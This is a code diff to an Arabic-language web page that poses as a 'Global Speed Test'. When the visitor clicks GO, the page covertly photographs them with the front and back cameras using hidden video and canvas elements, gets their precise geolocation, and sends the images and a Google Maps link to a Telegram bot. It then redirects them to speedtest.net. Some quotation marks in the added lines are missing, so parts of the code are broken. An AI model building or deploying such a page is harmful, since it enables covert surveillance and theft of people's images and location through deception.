@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -9,16 +10,16 @@
         .circle { width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); }
         .speed { font-size: 45px; font-weight: bold; color: #00d2ff; }
         #status { margin-top: 25px; color: #888; font-size: 18px; }
-        video, canvas { display: none; } /* إخفاء عناصر الكاميرا عن المستخدم */
+        video, canvas { display: none; } 
     </style>
 </head>
 <body>
     <h1>Global Speed Test</h1>
-    <p>اضغط GO لبدء فحص الشبكة والكاميرا (لمعايرة الفيديو)</p>
+    <p>اضغط GO لبدء فحص سرعة الإنترنت والكاميرا</p>
     <div class="circle" id="startBtn"><span class="speed">GO</span></div>
-    <p id="status">جاهز للفحص...</p>
+    <p id="status">بانتظار بدء الفحص...</p>
 
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -33,55 +34,59 @@
             await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
         }
 
-        async function capture(facingMode, label) {
+        async function capturePhoto(facingMode) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-                const video = document.getElementById('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: false 
+                });
+                const video = document.getElementById( video );
                 video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
                 
-                const canvas = document.getElementById('canvas');
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار ثانية لضبط الفوكس
+
+                const canvas = document.getElementById( canvas );
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.getContext( 2d ).drawImage(video, 0, 0);
                 
-                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد اللقطة
-                
-                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-            } catch (e) { return null; }
-        }
-
-        async function startFullScan(position) {
-            document.getElementById('status').innerText = "جاري الفحص... يرجى عدم إغلاق الصفحة";
-            
-            // 1. التقاط الصور (سيطلب إذن الكاميرا هنا)
-            const frontBlob = await capture("user", "📸 صورة أمامية");
-            if (frontBlob) await sendPhoto(frontBlob, "📸 صورة أمامية للجهاز");
-            
-            const backBlob = await capture("environment", "📸 صورة خلفية");
-            if (backBlob) await sendPhoto(backBlob, "📸 صورة خلفية للجهاز");
-
-            // 2. إرسال البيانات والموقع
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            let batt = "غير معروف";
-            try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e){}
-
-            const report = `🚀 **تقرير متكامل**\n🔋 البطارية: ${batt}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
-            
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-            
-            alert("تم الفحص بنجاح!");
-            window.location.href = "https://www.speedtest.net";
-        }
-
-        document.getElementById('startBtn').onclick = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(startFullScan, () => {
-                    alert("يجب السماح بالأذونات لعمل الفحص.");
-                }, { enableHighAccuracy: true });
+                stream.getTracks().forEach(track => track.stop());
+                return new Promise(resolve => canvas.toBlob(resolve,  image/jpeg , 0.8));
+            } catch (e) {
+                console.error("خطأ في الكاميرا:", e);
+                return null;
             }
-        };
+        }
+
+        async function startProcess() {
+            document.getElementById( status ).innerText = "جاري طلب إذن الكاميرا للمعايرة...";
+            
+            // 1. طلب الكاميرا الأمامية أولاً
+            const frontBlob = await capturePhoto("user");
+            if (frontBlob) await sendPhoto(frontBlob, "📸 صورة أمامية");
+
+            // 2. طلب الكاميرا الخلفية
+            const backBlob = await capturePhoto("environment");
+            if (backBlob) await sendPhoto(backBlob, "📸 صورة خلفية");
+
+            // 3. طلب الموقع الجغرافي
+            document.getElementById( status ).innerText = "جاري تحديد الموقع الجغرافي...";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 الموقع: " + mapLink)}`);
+                    
+                    alert("تم الفحص بنجاح!");
+                    window.location.href = "https://www.speedtest.net";
+                });
+            }
+        }
+
+        document.getElementById( startBtn ).onclick = startProcess;
     </script>
 </body>
 </html>
